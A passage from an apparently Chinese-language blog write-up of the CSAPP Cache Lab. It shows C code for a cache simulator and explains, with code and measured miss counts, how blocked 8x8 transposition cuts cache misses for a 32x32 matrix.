class="string">&#x27;h&#x27;</span>:</span><br><span class="line">				help(argv);</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">				v = <span class="number">1</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">				s = atoi(optarg);</span><br><span class="line">				s_pow = <span class="number">1</span> &lt;&lt; s;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;E&#x27;</span>:</span><br><span class="line">				E = atoi(optarg);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;b&#x27;</span>:</span><br><span class="line">				b = atoi(optarg);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;t&#x27;</span>:</span><br><span class="line">				<span class="keyword">if</span> ((fp = fopen(optarg, <span class="string">&quot;r&quot;</span>)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">					<span class="built_in">printf</span>(<span class="string">&quot;ERROR!%s open failed!\n&quot;</span>, optarg);</span><br><span class="line">					<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">				help(argv);</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (s == <span class="number">0</span> || E == <span class="number">0</span> || b == <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%s: Missing required command line argument\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">		help(argv);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cache = (unit*)<span class="built_in">malloc</span>(<span class="number">16</span> * s_pow * E);		<span class="comment">/* 16是因为考虑了对齐 */</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s_pow * E; i++) &#123;</span><br><span class="line">		cache[i].valid = cache[i].tag = cache[i].count = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (fgets(buffer, MAXBUF, fp)) &#123;			<span class="comment">/* 逐行分析 */</span></span><br><span class="line">		<span class="keyword">char</span> c;</span><br><span class="line">		<span class="keyword">int</span> op = <span class="number">0</span>, comma = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> offset = <span class="number">0</span>, tag = <span class="number">0</span>, index = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> size = <span class="number">0</span>, address = <span class="number">0</span>;</span><br><span class="line">		count++;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; (c = buffer[i]) &amp;&amp; (c != <span class="string">&#x27;\n&#x27;</span>); i++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (c == <span class="string">&#x27; &#x27;</span>) <span class="keyword">continue</span>;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;I&#x27;</span>) op = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;L&#x27;</span> || c == <span class="string">&#x27;S&#x27;</span>) op = <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;M&#x27;</span>) op = <span class="number">2</span>;</span><br><span class="line">			<span class="keyword">else</span> <span class="keyword">if</span> (c == <span class="string">&#x27;,&#x27;</span>) comma = <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">if</span> (comma)	size = hextodec(c);	<span class="comment">/* 当读取到逗号时，之后的数据是size大小 */</span></span><br><span class="line">				<span class="keyword">else</span>		address = <span class="number">16</span> * address + hextodec(c);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; b; i++) &#123;			<span class="comment">/* 实际上offset在本实验中没用，可以抛弃 */</span></span><br><span class="line">			offset = offset * <span class="number">2</span> + address % <span class="number">2</span>;</span><br><span class="line">			address &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s; i++) &#123;</span><br><span class="line">			index = index * <span class="number">2</span> + address % <span class="number">2</span>;</span><br><span class="line">			address &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		tag = address;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (v &amp;&amp; op)</span><br><span class="line">			print(buffer);</span><br><span class="line">		<span class="keyword">if</span> (op == <span class="number">1</span>) &#123;</span><br><span class="line">			load_store(count, tag, index, offset, size, E);</span><br><span class="line">			<span class="keyword">if</span> (v) <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">			</span><br><span class="line">		<span class="keyword">if</span> (op == <span class="number">2</span>) &#123;</span><br><span class="line">			load_store(count, tag, index, offset, size, E);</span><br><span class="line">			hit_count++;</span><br><span class="line">			<span class="keyword">if</span> (v)	<span class="built_in">printf</span>(<span class="string">&quot; hit\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;	</span><br><span class="line"></span><br><span class="line">	<span class="built_in">free</span>(cache);</span><br><span class="line">	fclose(fp);</span><br><span class="line">	printSummary(hit_count, miss_count, eviction_count);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">help</span><span class="params">(<span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Usage: %s [-hv] -s &lt;num&gt; -E &lt;num&gt; -b &lt;num&gt; -t &lt;file&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Options:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;  -h\t\tPrint this help message.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;  -v\t\tOptional verbose flag.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;  -s &lt;num&gt;\tNumber of set index bits.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;  -E &lt;num&gt;\tNumber of lines per set.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;  -b &lt;num&gt;\tNumber of block offset bits.\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;  -t &lt;file&gt;\tTrace file.\n\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Examples:\n&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;  linux&gt;  %s -s 4 -E 1 -b 4 -t traces/yi.trace\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;  linux&gt;  %s -v -s 8 -E 2 -b 4 -t traces/yi.trace\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">load_store</span><span class="params">(<span class="keyword">int</span> count, <span class="keyword">unsigned</span> tag, <span class="keyword">unsigned</span> index, <span class="keyword">unsigned</span> offset, <span class="keyword">unsigned</span> size, <span class="keyword">int</span> E)</span> </span>&#123;</span><br><span class="line">	<span class="comment">//is it already in the cache?</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; E; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (cache[IDX(index, i, E)].tag == tag &amp;&amp; cache[IDX(index, i, E)].valid) &#123;</span><br><span class="line">			cache[IDX(index, i, E)].count = count;</span><br><span class="line">			hit_count++;</span><br><span class="line">			<span class="keyword">if</span> (v) <span class="built_in">printf</span>(<span class="string">&quot; hit&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	miss_count++;</span><br><span class="line">	<span class="keyword">if</span> (v) <span class="built_in">printf</span>(<span class="string">&quot; miss&quot;</span>);</span><br><span class="line">	<span class="comment">//is set already full?</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; E; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!cache[IDX(index, i, E)].valid) &#123;</span><br><span class="line">			cache[IDX(index, i, E)].valid = <span class="number">1</span>;</span><br><span class="line">			cache[IDX(index, i, E)].tag = tag;</span><br><span class="line">			cache[IDX(index, i, E)].count = count;</span><br><span class="line">			<span class="keyword">return</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//full</span></span><br><span class="line">	<span class="keyword">int</span> min_index = <span class="number">0</span>, min_count = INT_MAX;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; E; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (cache[IDX(index, i, E)].count &lt; min_count) &#123;</span><br><span class="line">			min_count = cache[IDX(index, i, E)].count;</span><br><span class="line">			min_index = i;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	cache[IDX(index, min_index, E)].tag = tag;</span><br><span class="line">	cache[IDX(index, min_index, E)].count = count;</span><br><span class="line"> 	eviction_count++;</span><br><span class="line">	<span class="keyword">if</span> (v) <span class="built_in">printf</span>(<span class="string">&quot; eviction&quot;</span>);</span><br><span class="line">&#125;	</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hextodec</span><span class="params">(<span class="keyword">char</span> c)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (c &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">    	<span class="keyword">return</span> c - <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">  	<span class="keyword">if</span> (c &gt;= <span class="string">&#x27;A&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;F&#x27;</span>) &#123;</span><br><span class="line">    	<span class="keyword">return</span> c - <span class="string">&#x27;A&#x27;</span> + <span class="number">10</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">  	<span class="keyword">if</span> (c &gt;= <span class="string">&#x27;a&#x27;</span> &amp;&amp; c &lt;= <span class="string">&#x27;f&#x27;</span>) &#123;</span><br><span class="line">    	<span class="keyword">return</span> c - <span class="string">&#x27;a&#x27;</span> + <span class="number">10</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">  	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(<span class="keyword">char</span> buf[])</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; buf[i] != <span class="string">&#x27;\n&#x27;</span>; i++)</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, buf[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">unix&gt;</span><span class="bash"> make clean</span></span><br><span class="line"><span class="meta">unix&gt;</span><span class="bash"> make</span></span><br><span class="line"><span class="meta">unix&gt;</span><span class="bash"> ./test-csim</span></span><br></pre></td></tr></table></figure>

<p>进行测试，注意不要自行定义<code>printSummary()</code>函数，该函数在<code>cachelab.h</code>中声明，在<code>cachelab.c</code>中定义，无需自行声明定义</p>
<h2 id="Part-B-1"><a href="#Part-B-1" class="headerlink" title="Part B"></a>Part B</h2><p>此时此刻，相较于写单纯地写试验记录，我更想记录下做<code>Part B</code>这部分的心路历程。可以说，<code>Part B</code>部分是目前做过的所有实验里最麻烦、最困难、最坑的，我必须得承认在过去的几天我被折磨得很难受，甚至在昨天回学校的飞机上我也一直在想解题思路，看了很多题解加上心无旁骛的弄了很久才终于将终于得出满分答案。但直到现在做出来我还是很沮丧的，因为<code>CacheLab</code>两个部分我都没能独立完成。<code>Part A</code>按自己方法做出来但是就是无法正常运行，<code>Part B</code>阅读完网络旁注的提示也没有丝毫头绪，于是看别人题解，看一眼，感觉懂了，有思路了，又自己做，又无从下手，又看，只看个大概，又觉得自己懂了，又自己做，又卡住……这种轮回在过去的三天至少发生了十多次。很多时候看了题解有了思路，反思自己，其实再多想想也未必想不到，但就是想要依赖现成的、“完全正确的”答案，哪怕最后做出来了，也不是靠自己的思考与实践弄出来的，总是心情低落。又鉴于此部分坑多题难，于是想要好好写一写题解，用自己的话、自己的理解把一切东西都说清楚，才算真正做懂了这个实验</p>
<p>首先想要提醒的是这个实验的一个究极大坑：当完成<code>trans.c</code>程序后，按照实验文档说明检验自己的程序</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">unix&gt;</span><span class="bash"> make clean</span></span><br><span class="line"><span class="meta">unix&gt;</span><span class="bash"> make</span></span><br><span class="line"><span class="meta">unix&gt;</span><span class="bash"> ./test-trans -M 64 -N 64</span></span><br></pre></td></tr></table></figure>

<p>发现这个<code>test-trans</code>程序运行极慢，需要几十秒甚至几分钟才能出结果，而且最后弹出一个超时错误</p>
<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Step 1: Validating and generating memory traces</span><br><span class="line"><span class="keyword">Error: </span>Program timed out.</span><br></pre></td></tr></table></figure>

<p>呵呵，一开始我也没觉得有啥不对劲，单纯以为这个程序就是跑得很慢，或者显示超时可能是我的代码逻辑出错了。但是哪怕我使用别人题解里正确的、通过测试的代码，在我的机器上仍是超时，而在别人的机器上则能轻松通过。上网查了一下这个问题，相关回答很少，但有一个管用的解决方法：将解压出来的文件夹放到<code>linux</code>系统的桌面，即可正常运行。具体是什么原因导致的这个大坑我也没弄清楚，但此方法是可行的，至此我才知此前我检测答案时动辄三五分钟的运行时间，还只能得到一个<code>Program timed out</code>错误是有多离谱</p>
<p>接下来分析一下具体实验内容，这里结合我几次想当然走而犯的错，提醒一下，<strong>必须要仔细审题</strong>，首先，这个部分的<code>cache</code>采用的是直接映射替换策略（我当初想当然以为是全相联，说多了都是泪），<code>cache</code>一共<code>32</code>组，一组一行，而一行又可存储<code>32</code>个字节。因为本题是求<code>int</code>型矩阵的转置，而一个<code>int</code>是四字节大小，<strong>因此<code>cache</code>中一行最多能存八个矩阵元素</strong>，整个<code>cache</code>最多能存储<code>256</code>个矩阵元素</p>
<p>本题只有三个测试矩阵</p>
<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">32 </span>x <span class="number">32</span>(M = <span class="number">32</span>, N = <span class="number">32</span>)</span><br><span class="line"><span class="symbol">64 </span>x <span class="number">64</span>(M = <span class="number">64</span>, N = <span class="number">64</span>)</span><br><span class="line"><span class="symbol">61 </span>x <span class="number">67</span>(M = <span class="number">61</span>, N = <span class="number">67</span>)</span><br></pre></td></tr></table></figure>

<p>且A矩阵是N行M列，B矩阵是M行N列，先讨论<code>32 x 32</code>大小的矩阵</p>
<p>在继续向下前确保你已阅读[这篇文章](<a target="_blank" rel="noopener" href="http://csapp.cs.cmu.edu/public/waside/waside-blocking.pdf">waside-blocking.dvi (cmu.edu)</a>)并理解其原理</p>
<h3 id="32-x-32"><a href="#32-x-32" class="headerlink" title="32 x 32"></a>32 x 32</h3><p>要完成对一个矩阵进行转置，这是实验自带的一个解答</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trans</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, tmp;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j++) &#123;</span><br><span class="line">            tmp = A[i][j];</span><br><span class="line">            B[j][i] = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;    </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序正确性一目了然，但缺失率呢？</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Function <span class="number">0</span> (<span class="number">1</span> total)</span><br><span class="line">Step <span class="number">1</span>: Validating <span class="keyword">and</span> generating memory traces</span><br><span class="line">Step <span class="number">2</span>: Evaluating performance (s=<span class="number">5</span>, E=<span class="number">1</span>, b=<span class="number">5</span>)</span><br><span class="line">func <span class="number">0</span> (Simple row-wise scan transpose): hits:<span class="number">870</span>, misses:<span class="number">1183</span>, evictions:<span class="number">1151</span></span><br></pre></td></tr></table></figure>

<p>此题若要拿到满分，需要将<code>misses</code>降到300以下，显然此方法缺失率过高。究其原因，上述代码并未很好利用空间局限性性质，试想第一次访问<code>A[0][0]</code>元素时，冷不命中，于是将<code>A[0][0]</code>至<code>A[0][7]</code>元素加载于<code>cache</code>同一行中，对于A数组放在同一个<code>set</code>中的八个元素，八次访问中，缺失一次，命中七次，命中率尚可。但若考虑B数组，B数组按列访问，<code>B[0][0]</code>与<code>B[1][0]</code>之间隔了31个元素，若<code>B[0][0]</code>映射于<code>set 0</code>中，冷不命中，则<code>B[1][0]</code>映射于<code>set 4</code>中，冷不命中，<code>B[2][0]</code>映射于<code>set 7</code>中，冷不命中，……，<code>B[7][0]</code>映射于<code>set 28</code>中，而此时若访问<code>B[8][0]</code>，由于只有32个组，因此<code>B[8][0]</code>又将映射到<code>set 0</code>中，将原本<code>B[0][0]</code>等元素覆盖掉，访问<code>B[9][0]</code>也会将<code>B[1][0]</code>所在组的元素全覆盖掉，每一次访问都不命中。因此，<code>32 x 32</code>型矩阵，B数组最多连续八列于<code>cache</code>中。即如果我们将B数组的连续八列放于<code>cache</code>中，刚好不会互相覆盖，然后将这八列所在的八个<code>set</code>均填满，就能像访问A数组一样做到连续八个元素的访问中七次命中，一次缺失，代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trans0</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i, j, ii, a0, a1, a2, a3, a4, a5, a6, a7;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i += <span class="number">8</span>) &#123;</span><br><span class="line">		<span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j += <span class="number">8</span>) &#123;</span><br><span class="line">			<span class="keyword">for</span> (ii = i; ii &lt; i + <span class="number">8</span>; ii++) &#123;</span><br><span class="line">				a0 = A[ii][j + <span class="number">0</span>];</span><br><span class="line">				a1 = A[ii][j + <span class="number">1</span>];</span><br><span class="line">				a2 = A[ii][j + <span class="number">2</span>];</span><br><span class="line">				a3 = A[ii][j + <span class="number">3</span>];</span><br><span class="line">				a4 = A[ii][j + <span class="number">4</span>];</span><br><span class="line">				a5 = A[ii][j + <span class="number">5</span>];</span><br><span class="line">				a6 = A[ii][j + <span class="number">6</span>];</span><br><span class="line">				a7 = A[ii][j + <span class="number">7</span>];</span><br><span class="line">				B[j + <span class="number">0</span>][ii] = a0;</span><br><span class="line">				B[j + <span class="number">1</span>][ii] = a1;</span><br><span class="line">				B[j + <span class="number">2</span>][ii] = a2;</span><br><span class="line">				B[j + <span class="number">3</span>][ii] = a3;</span><br><span class="line">				B[j + <span class="number">4</span>][ii] = a4;</span><br><span class="line">				B[j + <span class="number">5</span>][ii] = a5;</span><br><span class="line">				B[j + <span class="number">6</span>][ii] = a6;</span><br><span class="line">				B[j + <span class="number">7</span>][ii] = a7;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>建议拿上纸和笔演算一下。上述代码将矩阵分成<code>8 x 8</code>的块，对每块分别进行转置，实际上利用的就是网络旁注文章中介绍的思想。该函数测试结果如下</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Function <span class="number">1</span> (<span class="number">2</span> total)</span><br><span class="line">Step <span class="number">1</span>: Validating <span class="keyword">and</span> generating memory traces</span><br><span class="line">Step <span class="number">2</span>: Evaluating performance (s=<span class="number">5</span>, E=<span class="number">1</span>, b=<span class="number">5</span>)</span><br><span class="line">func <span class="number">1</span> (Improved version <span class="number">1</span>): hits:<span class="number">1766</span>, misses:<span class="number">287</span>, evictions:<span class="number">255</span></span><br></pre></td></tr></table></figure>

<p>已达到本题满分要求</p>
<p>按上述思路，理想状态下缺失数应为<code>(8 + 8) * 16 = 256</code>次，<code>8 + 8</code>代表一个<code>8 x 8</code>的小块里A矩阵八次缺失加上B矩阵八次缺失，<code>16</code>为块数目。而我们缺失次数为<code>287</code>，多了31次，深入分析发现转置位于矩阵对角线上的元素会带来额外一次缺失，例如，初始访问<code>A[0][0]</code>，冷不命中，将<code>A[0][0]</code>至<code>A[0][7]</code>加载至<code>set 0</code>中，接着将<code>B[0][0]</code>至<code>B[7][0]</code>加载于<code>cache</code>中。理想情况下，B数组加载至<code>cache</code>中的<code>set</code>应该一直在缓存里，不被换出，直至全部填满。但考虑当访问A数组至<code>A[1][0]</code>元素开头的八个元素时，这些元素将会映射到<code>B[1][0]</code>所处的<code>set</code>中，将其覆盖，当后续再度访问<code>B[1][0]</code>等元素时，将发生缺失。这是我们不愿意看到的，考虑是否有方法可以避免这样的“悲剧”发生呢？</p>
<p>梳理一下问题，即若我们先将B数组的各列加载于<code>cache</code>中，在访问A数组过程中将会把某些B数组已加载的值覆盖掉。要避免覆盖的发生，只有想办法在访问A数组对应列之前，不访问后续B数组的列。例如，如果我们先将<code>B[5][0]</code>所在行加载于<code>cache</code>，当A数组访问至<code>A[5][0]</code>时，将其覆盖，后续再访问<code>B[5][0]</code>所在<code>set</code>内的元素将发生一次缺失。而<code>A[5][0]</code>至<code>A[5][7]</code>只会加载入缓存一次，待这次加载后再将<code>B[5][0]</code>至<code>B[5][7]</code>加载入缓存，不再可能发生覆盖，问题得到解决。</p>
<p>因此，我们得将A数组获得的、属于后续B数组列的值暂存在某个地方，待时机成熟后再让暂存的值回归正确位置，具体做法请见代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; N; i += <span class="number">8</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; M; j += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i == j) &#123; <span class="comment">// i, j值相等，对角线位于此块内</span></span><br><span class="line">            a0 = A[i + <span class="number">0</span>][j + <span class="number">0</span>], a1 = A[i + <span class="number">0</span>][j + <span class="number">1</span>], a2 = A[i + <span class="number">0</span>][j + <span class="number">2</span>], a3 = A[i + <span class="number">0</span>][j + <span class="number">3</span>];</span><br><span class="line">            a4 = A[i + <span class="number">0</span>][j + <span class="number">4</span>], a5 = A[i + <span class="number">0</span>][j + <span class="number">5</span>], a6 = A[i + <span class="number">0</span>][j + <span class="number">6</span>], a7 = A[i + <span class="number">0</span>][j + <span class="number">7</span>];</span><br><span class="line">            B[i + <span class="number">0</span>][j + <span class="number">0</span>] = a0, B[i + <span class="number">0</span>][j + <span class="number">1</span>] = a1, B[i + <span class="number">0</span>][j + <span class="number">2</span>] = a2, B[i + <span class="number">0</span>][j + <span class="number">3</span>] = a3;</span><br><span class="line">            B[i + <span class="number">0</span>][j + <span class="number">4</span>] = a4, B[i + <span class="number">0</span>][j + <span class="number">5</span>] = a5, B[i + <span class="number">0</span>][j + <span class="number">6</span>] = a6, B[i + <span class="number">0</span>][j + <span class="number">7</span>] = a7;</span><br><span class="line"></span><br><span class="line">            a0 = A[i + <span class="number">1</span>][j + <span class="number">0</span>], a1 = A[i + <span class="number">1</span>][j + <span class="number">1</span>], a2 = A[i + <span class="number">1</span>][j + <span class="number">2</span>], a3 = A[i + <span class="number">1</span>][j + <span class="number">3</span>];</span><br><span class="line">            a4 = A[i + <span class="number">1</span>][j + <span class="number">4</span>], a5 = A[i + <span class="number">1</span>][j + <span class="number">5</span>], a6 = A[i + <span class="number">1</span>][j + <span class="number">6</span>], a7 = A[i + <span class="number">1</span>][j + <span class="number">7</span>];</span><br><span class="line">            B[i + <span class="number">1</span>][j + <span class="number">0</span>] = B[i + <span class="number">0</span>][j + <span class="number">1</span>], B[i + <span class="number">0</span>][j + <span class="number">1</span>] = a0;</span><br><span class="line">            B[i + <span class="number">1</span>][j + <span class="number">1</span>] = a1, B[i + <span class="number">1</span>][j + <span class="number">2</span>] = a2, B[i + <span class="number">1</span>][j + <span class="number">3</span>] = a3;</span><br><span class="line">            B[i + <span class="number">1</span>][j + <span 